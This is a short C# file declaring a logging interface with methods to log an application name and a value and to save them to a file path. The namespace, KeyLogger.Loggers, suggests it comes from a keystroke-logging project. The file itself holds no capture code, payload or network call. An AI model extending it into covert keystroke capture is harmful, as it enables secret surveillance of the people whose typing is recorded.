using System;
using System.Collections.Generic;
using System.Text;

namespace KeyLogger.Loggers
{
    interface ILogger
    {
        void Log(string application, string value);
        void Save(string filePath);
    }
}
